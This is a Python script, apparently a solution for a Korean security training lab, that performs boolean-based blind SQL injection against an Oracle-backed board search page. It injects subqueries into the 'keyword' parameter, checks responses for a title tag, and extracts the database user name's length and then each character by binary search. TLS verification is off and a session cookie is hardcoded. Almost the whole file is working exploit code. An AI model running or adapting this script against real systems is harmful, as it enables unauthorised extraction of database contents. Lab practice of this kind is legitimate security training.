import requests
import urllib3
import time

# InsecureRequestWarning 경고 비활성화
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 요청을 보낼 URL 정의
url = "https://lab.eqst.co.kr:8442/exam4/free"

# 🚨 중요: 아래 Cookie 값은 실습 시점에 맞는 본인의 JSESSIONID로 꼭 교체해주세요.
headers = {
    "Cookie": "JSESSIONID=2305081D833AC69F5ECBD05E4C9A967B"
}


# [수정된 부분 ①] - 가장 핵심적인 변경점
def test_query(payload):
    """
    주어진 페이로드의 참/거짓 여부를 서버 응답을 통해 확인하는 함수
    """
    params = {
        "page": "1",
        "sorting": "",
        "sortingAd": "",
        "startDt": "",
        "endDt": "",
        "searchType": "all",
        # 페이로드는 여기서 'pp' 검색어 조건과 결합됩니다.
        "keyword": f"pp%' and ({payload}) and 'j%'='j"
    }
    
    try:
        response = requests.get(url, headers=headers, params=params, verify=False)
        
        # [변경점] 'pp' 문자열 대신, 실제 게시물이 출력될 때만 나타나는
        # '<td class="title">' HTML 태그가 있는지 확인하여 성공/실패를 판단합니다.
        # 이것이 가장 정확하고 신뢰성 높은 방법입니다.
        return '<td class="title">' in response.text
        
    except requests.exceptions.RequestException as e:
        print(f"오류 발생: {e}")
        return False

# --- 아래 코드는 이전과 동일하게 안정적인 서브쿼리 방식을 유지합니다 ---

def find_user_length_linear():
    """
    1부터 5까지 순차적으로 길이를 확인하는 선형 탐색 함수
    """
    print("오라클 사용자 계정명 길이 추측 시작 (선형 탐색)...")
    
    for length in range(1, 6):
        # Oracle에서 더 안정적인 서브쿼리 구문을 사용합니다.
        payload = f"(SELECT LENGTH(user) FROM DUAL) = {length}"
        
        print(f"[*] 길이 {length} 확인 중...")

        if test_query(payload):
            print(f"\n[+] 사용자 계정명의 길이는 {length} 입니다.")
            return length
        
        time.sleep(0.1)

    print("\n[-] 1~5 글자 내에서 계정명 길이를 찾지 못했습니다.")
    return 0

# ===================================================================
# ## 메인 실행 로직 ##
# ===================================================================

# 1. 사용자 이름 길이 찾기
user_length = find_user_length_linear()

# 2. 찾은 길이를 바탕으로 사용자 이름 추측
if user_length > 0:
    print("\n이제 각 글자를 추측합니다...")
    
    found_username = ""
    for i in range(1, user_length + 1):
        low_char = 32
        high_char = 126
        
        char_code = 0
        while low_char <= high_char:
            mid_char = (low_char + high_char) // 2
            
            # 각 글자를 찾을 때도 안정적인 서브쿼리 구문을 사용합니다.
            payload = f"(SELECT ASCII(SUBSTR(user, {i}, 1)) FROM DUAL) > {mid_char}"
            
            if test_query(payload):
                char_code = mid_char + 1
                low_char = mid_char + 1
            else:
                high_char = mid_char - 1
            
            time.sleep(0.1)
        
        if char_code > 0:
            found_char = chr(char_code)
            found_username += found_char
            print(f"글자 {i}/{user_length}: '{found_char}' (아스키: {char_code})")
        else:
            print(f"글자 {i}/{user_length}: 추측 실패")
            break
            
    print("-" * 30)
    print(f"✅ 추출된 오라클 사용자 계정명: {found_username}")

else:
    print("계정명 길이를 찾지 못해 사용자 이름 추측을 진행하지 않습니다.")